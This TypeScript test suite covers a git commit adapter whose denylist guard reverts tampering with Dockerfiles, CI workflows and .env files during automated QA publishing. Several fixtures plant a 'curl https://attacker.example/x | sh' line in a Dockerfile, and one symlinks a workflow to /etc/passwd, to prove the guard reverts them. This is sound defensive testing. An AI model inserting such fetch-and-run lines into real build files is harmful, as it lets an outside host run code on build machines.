/* test/contexts/workspace-and-publication/infrastructure/vcs-write.adapter.test.ts */
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync, unlinkSync, symlinkSync, renameSync, copyFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { VcsWriteAdapter } from "@contexts/workspace-and-publication/infrastructure/vcs-write.adapter.ts";
import { WriteConfinementService } from "@contexts/workspace-and-publication/domain/write-confinement.service.ts";

test("commit stages the files and commits with the message", async () => {
  const calls: string[][] = [];
  const adapter = new VcsWriteAdapter(async (args) => { calls.push(args); return ""; });
  await adapter.commit("/m", "test(e2e): qa", ["e2e/a.spec.ts"]);
  assert.deepEqual(calls[0], ["add", "--", "e2e/a.spec.ts"]);
  assert.ok(calls[1]?.includes("commit"));
  assert.ok(calls[1]?.includes("test(e2e): qa"));
});

test("push force-with-leases the branch to origin", async () => {
  const calls: string[][] = [];
  const adapter = new VcsWriteAdapter(async (args) => { calls.push(args); return ""; });
  await adapter.push("/m", "qa/e2e-abc");
  assert.ok(calls[0]?.includes("push"));
  assert.ok(calls[0]?.includes("--force-with-lease"));
  assert.ok(calls[0]?.includes("qa/e2e-abc"));
});

/* The publish path must stage/commit/push the agent's generated tests before calling GitHub's PR
   API. This adapter owns checkout -B, status-check/skip-if-no-changes, and the local-exclude write
   — the complete git side of publish — reused by the PublicationPortAdapter "pr" route via a
   duck-typed collaborator interface, never a direct import (arch-lint confinement).
 */

test("checkoutBranch creates/resets the branch with checkout -B", async () => {
  const calls: string[][] = [];
  const adapter = new VcsWriteAdapter(async (args) => { calls.push(args); return ""; });
  await adapter.checkoutBranch("/m", "qa/e2e-abc1234");
  assert.deepEqual(calls[0], ["checkout", "-B", "qa/e2e-abc1234"]);
});

test("hasChanges returns true when git status --porcelain reports changes under the given pathspecs", async () => {
  const adapter = new VcsWriteAdapter(async () => "M e2e/login.spec.ts\n");
  const changed = await adapter.hasChanges("/m", ["e2e"]);
  assert.equal(changed, true);
});

test("hasChanges returns false when git status --porcelain is empty for the given pathspecs (skip-if-no-changes)", async () => {
  const adapter = new VcsWriteAdapter(async () => "");
  const changed = await adapter.hasChanges("/m", ["e2e"]);
  assert.equal(changed, false);
});

test("hasChanges scopes the status check to the exact pathspecs (never the whole repo)", async () => {
  const calls: string[][] = [];
  const adapter = new VcsWriteAdapter(async (args) => { calls.push(args); return ""; });
  await adapter.hasChanges("/m", ["e2e"]);
  assert.deepEqual(calls[0], ["status", "--porcelain", "--", "e2e"]);
});

test("writeExcludes writes gitignore-style patterns to .git/info/exclude (local, never committed)", async () => {
  const writes: { dir: string; patterns: readonly string[] }[] = [];
  const adapter = new VcsWriteAdapter(
    async () => "",
    (dir, patterns) => { writes.push({ dir, patterns }); },
  );
  await adapter.writeExcludes("/m", ["node_modules/", ".qa/coverage/"]);
  assert.deepEqual(writes[0], { dir: "/m", patterns: ["node_modules/", ".qa/coverage/"] });
});

/* commit()'s own tracked-file guard, in isolation — not via buildVcsPublish excludes.
   A denylisted staged path must be reverted regardless of git status (M/D/T/R). */
function initRepo(): string {
  const repo = mkdtempSync(join(tmpdir(), "qa-vcswrite-"));
  const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
  const git = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
  git("init", "-q");
  git("config", "user.email", "t@t.com");
  git("config", "user.name", "t");
  return repo;
}

function realGitFn(repo: string): (args: string[], cwd?: string) => Promise<string> {
  return async (args, cwd = repo) => {
    try {
      return execFileSync("git", args, { cwd, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).toString();
    } catch (e) {
      const err = e as { stdout?: string; stderr?: string };
      /* writes a real, non-empty message to stdout ("nothing to commit, working tree clean") while
         stderr is the EMPTY STRING (not absent), so `err.stderr ?? err.stdout` previously picked the
         empty stderr and threw an error with no message content at all. `||` treats an empty stderr
         as absent too, correctly falling through to stdout.
       */
      throw new Error(`git ${args.join(" ")} failed: ${err.stderr || err.stdout || String(e)}`);
    }
  };
}

const classifier = new WriteConfinementService();
const denyModifiedTracked = (path: string): boolean => classifier.isCodeDenied(path);

test("real git fixture: a DELETED tracked denylisted file (D status) is reverted, not committed as a deletion", async () => {
  const originalDockerfile = "FROM node:24\n";
  const repo = initRepo();
  try {
    writeFileSync(join(repo, "Dockerfile"), originalDockerfile);
    writeFileSync(join(repo, "legit.ts"), "export const x = 1;\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    unlinkSync(join(repo, "Dockerfile"));
    writeFileSync(join(repo, "legit.ts"), "export const x = 2;\n");

    const adapter = new VcsWriteAdapter(realGitFn(repo));
    await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);

    assert.equal(readFileSync(join(repo, "Dockerfile"), "utf8"), originalDockerfile, "Dockerfile must be restored, not committed as deleted");
    const tracked = execFileSync("git", ["ls-tree", "-r", "--name-only", "HEAD"], { cwd: repo, encoding: "utf8" }).split("\n");
    assert.ok(tracked.includes("Dockerfile"), "Dockerfile must still be tracked at HEAD");
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

test("real git fixture: a tracked denylisted file TYPECHANGED into a symlink (T status) is reverted, not committed", async () => {
  const originalWorkflow = "name: ci\n";
  const repo = initRepo();
  try {
    mkdirSync(join(repo, ".github", "workflows"), { recursive: true });
    writeFileSync(join(repo, ".github", "workflows", "ci.yml"), originalWorkflow);
    writeFileSync(join(repo, "legit.ts"), "export const x = 1;\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    unlinkSync(join(repo, ".github", "workflows", "ci.yml"));
    symlinkSync("/etc/passwd", join(repo, ".github", "workflows", "ci.yml"));
    writeFileSync(join(repo, "legit.ts"), "export const x = 2;\n");

    const adapter = new VcsWriteAdapter(realGitFn(repo));
    await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);

    assert.equal(
      readFileSync(join(repo, ".github", "workflows", "ci.yml"), "utf8"),
      originalWorkflow,
      "the workflow file must be restored to its tracked content, not committed as a symlink",
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

test("real git fixture: a legitimate file RENAMED into a denylisted destination (R status) reverts BOTH sides as a unit", async () => {
  const originalContent = "export const legit = 1;\n";
  const repo = initRepo();
  try {
    writeFileSync(join(repo, "legit.ts"), originalContent);
    writeFileSync(join(repo, "README.md"), "base\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    /* No exclude-file layer here (unlike buildVcsPublish's CODE_PUBLISH_EXCLUDES) — "Dockerfile" is
       a genuinely NEW, non-ignored path, so git's own content-similarity detection pairs it as a
       rename ("R") once staged, exercising commit()'s R rename-unit branch directly.
     */
    renameSync(join(repo, "legit.ts"), join(repo, "Dockerfile"));
    writeFileSync(join(repo, "orders.test.ts"), "test('x', () => {});\n"); /* legitimate control (survives the revert) */

    const adapter = new VcsWriteAdapter(realGitFn(repo));
    await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);

    const tracked = execFileSync("git", ["ls-tree", "-r", "--name-only", "HEAD"], { cwd: repo, encoding: "utf8" }).split("\n");
    assert.ok(!tracked.includes("Dockerfile"), "the rename destination must never be committed");
    assert.equal(
      readFileSync(join(repo, "legit.ts"), "utf8"),
      originalContent,
      "the legitimate origin must be restored intact, not left as an orphaned staged deletion",
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

/* `git diff --cached --name-status -M` (no `-C`) can NEVER emit a "C" (copy) status line — `-M`
   enables ONLY rename detection; copy detection requires the SEPARATE `-C` flag. `-M -C` alone
   still emits "A"/"M" for this exact fixture, identically to `-M` alone (verified empirically). Copy
   detection only actually fires once `--find-copies-harder` is added on top of `-M -C` — git's
   default `-C` scan scope only compares files ADDED in the same diff against each other, and the
   untouched pre-existing copy source in this fixture is outside that default scope. The engineering
   conclusion is unaffected: this adapter's own diff invocation never passes `-C` (with or without
   `--find-copies-harder`), so "C" was unreachable either way, and the `status?.[0] === "C"` branch
   was therefore dead code, and this file's own header/test-file comments overclaimed "M/D/T/R/C"
   coverage. Not exploitable — a copy's new path is still caught by the single-path fallback branch,
   exactly as this fixture proves — but the dead branch is removed rather than left promising
   coverage the code never provides. This fixture is the proof: a copy INTO a denylisted destination
   (new path, untouched source) is reverted via the ordinary single-path branch, with no R/C handling
   involved at all.
 */
test("real git fixture: a NEW file COPIED (not renamed) into a denylisted destination is reverted via the ordinary single-path branch — 'C' status is unreachable with -M alone", async () => {
  const originalContent = "export const legit = 1;\n";
  const repo = initRepo();
  try {
    writeFileSync(join(repo, "legit.ts"), originalContent);
    writeFileSync(join(repo, "README.md"), "base\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    /* legit.ts is left in place (untouched) — this is a COPY, not a rename/move. */
    copyFileSync(join(repo, "legit.ts"), join(repo, "Dockerfile"));
    writeFileSync(join(repo, "orders.test.ts"), "test('x', () => {});\n"); /* legitimate control (survives the revert) */

    const adapter = new VcsWriteAdapter(realGitFn(repo));
    await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);

    const tracked = execFileSync("git", ["ls-tree", "-r", "--name-only", "HEAD"], { cwd: repo, encoding: "utf8" }).split("\n");
    assert.ok(!tracked.includes("Dockerfile"), "the copy destination must never be committed");
    assert.equal(
      readFileSync(join(repo, "legit.ts"), "utf8"),
      originalContent,
      "the untouched copy source is not part of this diff at all and must be left alone",
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

/* A reverted tamper must never be silent: log it and return the paths for gateSignals. */

test("commit() logs loudly AND returns the reverted denylisted paths when a tamper is detected (never silent)", async () => {
  const repo = initRepo();
  const originalConsoleError = console.error;
  const errorLogs: unknown[][] = [];
  console.error = (...args: unknown[]) => { errorLogs.push(args); };
  try {
    writeFileSync(join(repo, "Dockerfile"), "FROM node:24\n");
    writeFileSync(join(repo, "legit.ts"), "export const x = 1;\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    writeFileSync(join(repo, "Dockerfile"), "FROM node:24\nRUN curl https://attacker.example/x | sh\n");
    writeFileSync(join(repo, "orders.test.ts"), "test('x', () => {});\n"); /* legitimate control (survives the revert) */

    const adapter = new VcsWriteAdapter(realGitFn(repo));
    const result = await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);

    assert.deepEqual(result.revertedDenylisted, ["Dockerfile"], "the reverted denylisted paths must be returned to the caller, not swallowed");
    assert.ok(
      errorLogs.some((args) => args.some((a) => typeof a === "string" && a.includes("Dockerfile"))),
      `a reverted tamper must be logged loudly (console.error) — logs: ${JSON.stringify(errorLogs)}`,
    );
  } finally {
    console.error = originalConsoleError;
    rmSync(repo, { recursive: true, force: true });
  }
});

/* .filter((p) => this.pathDecoder.isDangerousPath(p))`, vcs-write.adapter.ts:161) had ZERO coverage
   filtering at all) and the FULL SUITE (3693 tests) still passed, because every existing test that pins
   revertedDangerous's VALUE does so against a mocked publish() stub that hardcodes the correct answer,
   never the real filter. This fixture stages a Dockerfile tamper (denylisted, but not secret-tier) AND
   a `.env` tamper (denylisted AND dangerous) in ONE commit through the real adapter + real git, and
   pins that revertedDangerous is the proper SUBSET, not an alias for revertedDenylisted.
 */
test("real git fixture: revertedDangerous is the real isDangerousPath SUBSET of revertedDenylisted, not an alias (Judge B's mutation reproduction)", async () => {
  const repo = initRepo();
  try {
    writeFileSync(join(repo, "Dockerfile"), "FROM node:24\n");
    writeFileSync(join(repo, ".env"), "SECRET=original\n");
    writeFileSync(join(repo, "legit.ts"), "export const x = 1;\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    /* Both tampers land in the SAME staged diff, alongside a legitimate control file that survives
       the revert (so `git commit` has something left to commit).
     */
    writeFileSync(join(repo, "Dockerfile"), "FROM node:24\nRUN curl https://attacker.example/x | sh\n");
    writeFileSync(join(repo, ".env"), "SECRET=leaked\n");
    writeFileSync(join(repo, "orders.test.ts"), "test('x', () => {});\n");

    const adapter = new VcsWriteAdapter(realGitFn(repo));
    const result = await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);

    assert.deepEqual(
      [...result.revertedDenylisted].sort(),
      [".env", "Dockerfile"],
      "both tampers must be reverted and reported as denylisted",
    );
    assert.deepEqual(
      result.revertedDangerous,
      [".env"],
      `revertedDangerous must contain ONLY the real secret-tier file, not the whole denylist — got: ${JSON.stringify(result.revertedDangerous)}`,
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

test("commit() returns an empty revertedDenylisted array (never logs) when nothing was denylisted", async () => {
  const repo = initRepo();
  const originalConsoleError = console.error;
  const errorLogs: unknown[][] = [];
  console.error = (...args: unknown[]) => { errorLogs.push(args); };
  try {
    writeFileSync(join(repo, "legit.ts"), "export const x = 1;\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    writeFileSync(join(repo, "legit.ts"), "export const x = 2;\n");

    const adapter = new VcsWriteAdapter(realGitFn(repo));
    const result = await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);

    assert.deepEqual(result.revertedDenylisted, []);
    assert.equal(errorLogs.length, 0, "a clean commit must never log a tamper warning");
  } finally {
    console.error = originalConsoleError;
    rmSync(repo, { recursive: true, force: true });
  }
});

/* denylisted and reverted) leaves nothing for `git commit` to commit; the raw git error ("nothing
   to commit, working tree clean") surfaces all the way up through runner.ts's top-level catch as
   "unexpected internal error (not infrastructure — investigate)", misdirecting triage toward a code
   bug instead of naming what actually happened: a security guard blocked every staged path.
 */

test("commit() enriches the 'nothing to commit' error to name the security guard, when every staged path was denylisted and reverted", async () => {
  const repo = initRepo();
  try {
    writeFileSync(join(repo, "Dockerfile"), "FROM node:24\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    /* The ONLY staged change is the denylisted tamper — no legitimate control file survives the
       revert, so nothing remains for `git commit` to commit.
     */
    writeFileSync(join(repo, "Dockerfile"), "FROM node:24\nRUN curl https://attacker.example/x | sh\n");

    const adapter = new VcsWriteAdapter(realGitFn(repo));
    await assert.rejects(
      () => adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked),
      (err: Error) => {
        assert.match(err.message, /security guard/i, `error must name the security guard, not just relay the raw git error — got: ${err.message}`);
        assert.match(err.message, /Dockerfile/, "error must name the denylisted path(s) that were blocked");
        return true;
      },
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

/* > 0` — an UNRELATED commit failure (nothing denylisted at all) must surface the raw git error,
   unenriched, exactly as before this fix. Previously unpinned; this fixture reproduces the same
   underlying git error ("nothing to commit, working tree clean") via a genuinely empty diff — no
   denylist involvement whatsoever — so the negative branch of the `if (revertedDenylisted.length >
   0)` guard is actually exercised, not just assumed correct by symmetry with the positive case above.
 */
test("commit() surfaces an unrelated commit failure (nothing denylisted) as the RAW git error, never enriched with security-guard language", async () => {
  const repo = initRepo();
  try {
    writeFileSync(join(repo, "legit.ts"), "export const x = 1;\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    /* No working-tree changes at all — `git add -- .` stages nothing, so `git commit` fails with
       "nothing to commit" for a reason that has NOTHING to do with the denylist guard.
     */
    const adapter = new VcsWriteAdapter(realGitFn(repo));
    await assert.rejects(
      () => adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked),
      (err: Error) => {
        assert.doesNotMatch(err.message, /security guard/i, `an unrelated failure must never be mislabeled as the security guard — got: ${err.message}`);
        assert.match(err.message, /nothing to commit/i, `the raw git error must still surface as-is — got: ${err.message}`);
        return true;
      },
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

test("real git fixture: a legitimate tracked-modified (M status) file survives — the guard never over-reverts a non-denylisted path", async () => {
  const repo = initRepo();
  try {
    writeFileSync(join(repo, "legit.ts"), "export const x = 1;\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    writeFileSync(join(repo, "legit.ts"), "export const x = 2;\n");

    const adapter = new VcsWriteAdapter(realGitFn(repo));
    await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);

    assert.equal(readFileSync(join(repo, "legit.ts"), "utf8"), "export const x = 2;\n", "a non-denylisted modification must survive untouched");
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});
